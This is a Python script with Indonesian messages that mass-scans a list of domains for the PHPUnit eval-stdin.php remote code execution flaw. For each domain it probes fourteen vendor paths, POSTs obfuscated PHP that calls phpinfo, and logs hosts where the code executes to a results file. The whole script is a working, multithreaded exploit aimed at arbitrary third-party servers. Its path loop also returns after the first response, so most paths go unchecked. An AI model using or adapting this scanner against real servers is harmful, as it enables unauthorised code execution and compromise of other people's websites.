import requests
import brotli
import gzip
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO

php_code = """<?php $satu = "php"; $dua = "info"; $tiga = $satu . $dua; if (function_exists($tiga)) { $tiga(); } else { echo "Fungsi " . $tiga . " tidak ada."; } ?>"""
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "id,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Priority": "u=1",
    "Te": "trailers",
}
timeout = 10  # batas waktu untuk request dalam detik

paths = [
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/laravel/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/kyc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/prod/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
]

def read_urls(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        urls = file.readlines()
    return [url.strip() for url in urls]

def decompress_response(response):
    encoding = response.headers.get('Content-Encoding', '')
    if 'br' in encoding:
        return brotli.decompress(response.content).decode('utf-8')
    elif 'gzip' in encoding or 'deflate' in encoding:
        buf = BytesIO(response.content)
        with gzip.GzipFile(fileobj=buf) as f:
            return f.read().decode('utf-8')
    else:
        return response.text

def check_eval_stdin(domain):
    for path in paths:
        full_url = f"http://{domain}{path}"
        print(f"Checking URL: {full_url}")
        try:
            response = requests.get(full_url, headers=headers, timeout=timeout)
            if response.status_code == 200:
                print(f"Found {full_url}, attempting to execute PHP code...")
                response_exec = requests.post(full_url, headers=headers, data=php_code, timeout=timeout)
                print(f"Response status code: {response_exec.status_code}")
                print(f"Response headers: {response_exec.headers}")

                try:
                    response_text = decompress_response(response_exec)
                except Exception as e:
                    print(f"Error decompressing response from {full_url}: {e}")
                    response_text = response_exec.text

                print(f"Response text (first 500 chars): {response_text[:500]}")

                if response_exec.status_code == 200 and "<!DOCTYPE html" in response_text and "phpinfo()" in response_text:
                    result = f"{full_url} - eval-stdin.php ditemukan dan bisa dieksekusi."
                    with open("result_new.txt", "a", encoding='utf-8') as result_file:
                        result_file.write(result + "\n")
                    print(result)
                    return result
                else:
                    result = f"{full_url} - eval-stdin.php ditemukan tapi tidak bisa dieksekusi."
                    print(result)
                    return result
            else:
                result = f"{full_url} - eval-stdin.php tidak ditemukan."
                print(result)
                return result
        except requests.RequestException as e:
            print(f"{full_url} - Error: {str(e)}")
            continue
    return f"{domain} - eval-stdin.php tidak ditemukan di semua jalur."

def main(file_path):
    domains = read_urls(file_path)
    results = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_domain = {executor.submit(check_eval_stdin, domain): domain for domain in domains}
        for future in as_completed(future_to_domain):
            domain = future_to_domain[future]
            try:
                result = future.result()
                results.append(result)
            except Exception as exc:
                error_message = f"{domain} - Exception: {str(exc)}"
                results.append(error_message)
                print(error_message)

    for result in results:
        print(result)

if __name__ == "__main__":
    main("list.txt")
